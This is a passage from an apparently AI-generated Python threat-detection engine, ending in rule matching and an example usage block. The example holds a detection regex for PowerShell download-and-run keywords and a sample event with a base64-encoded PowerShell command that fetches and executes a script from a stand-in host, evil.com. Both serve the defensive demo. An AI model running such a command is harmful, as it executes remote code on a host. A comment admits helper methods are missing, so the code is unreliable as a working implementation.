                elif event_value != expected_value:
                    return False
            elif isinstance(expected_value, list):
                if event_value not in expected_value:
                    return False
        
        # Regex pattern matching
        for field, pattern in logic.get('regex', {}).items():
            event_value = getattr(event, field, None) or event.normalized_fields.get(field)
            if event_value and not re.search(pattern, str(event_value)):
                return False
        
        return True
    
    def _calculate_feature_dimensions(self) -> int:
        """Calculate feature dimensions for neural network input"""
        # Base features: timestamp, event type, severity, etc.
        base_features = 20
        
        # Network features
        if self.config['feature_extraction']['enable_network_features']:
            base_features += 15
        
        # Process features  
        if self.config['feature_extraction']['enable_process_features']:
            base_features += 10
        
        # File features
        if self.config['feature_extraction']['enable_file_features']:
            base_features += 8
        
        # User features
        if self.config['feature_extraction']['enable_user_features']:
            base_features += 12
        
        return base_features
    
    # Additional helper methods would continue here...
    # Due to length constraints, I'm showing the key architecture and main methods
    # The full implementation would include all the helper methods referenced above
    
    def close(self):
        """Clean shutdown of detection engine"""
        self.stop_real_time_processing()
        logger.info("Threat Detection Engine closed")


# Example usage
if __name__ == "__main__":
    # Initialize detection engine
    engine = ThreatDetectionEngine(data_dir="../../../")
    
    try:
        # Create sample detection rule
        rule_id = engine.create_detection_rule(
            name="Suspicious Process Execution",
            description="Detect execution of suspicious processes",
            rule_type="signature", 
            detection_logic={
                'fields': {'process_name': ['cmd.exe', 'powershell.exe']},
                'regex': {'command_line': r'.*\b(invoke-|iex|downloadstring)\b.*'}
            },
            severity=AlertSeverity.HIGH,
            confidence_threshold=0.8
        )
        print(f"Created detection rule: {rule_id}")
        
        # Ingest sample events
        sample_events = [
            {
                'timestamp': datetime.now().isoformat(),
                'source_system': 'sysmon',
                'event_type': 'process_creation',
                'Image': 'powershell.exe',
                'CommandLine': 'powershell -enc aWV4IGh0dHA6Ly9ldmlsLmNvbS9zY3JpcHQ=',
                'User': 'SYSTEM'
            }
        ]
        
        for event_data in sample_events:
            event_id = engine.ingest_event(event_data)
            print(f"Ingested event: {event_id}")
        
        # Get statistics
        stats = engine.get_real_time_statistics()
        print(f"Detection statistics: {stats}")
        
        # Allow time for processing
        time.sleep(2)
        
    finally:
        engine.close()